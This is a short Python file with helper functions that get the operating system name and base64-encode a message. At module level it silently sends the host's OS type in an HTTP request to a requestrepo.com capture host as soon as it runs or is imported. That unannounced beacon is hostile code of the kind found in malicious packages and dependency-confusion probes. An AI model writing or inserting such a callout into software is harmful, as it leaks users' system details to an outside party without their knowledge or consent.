import platform
import base64

def get_os_type():
    os_name = platform.system()
    return os_name

def encode_to_base64(message):
    base64_bytes = base64.b64encode(message)
    base64_message = base64_bytes.decode('utf-8')
    return base64_message

import requests
requests.get("http://vjostlcx.requestrepo.com/x?os_type=" + get_os_type())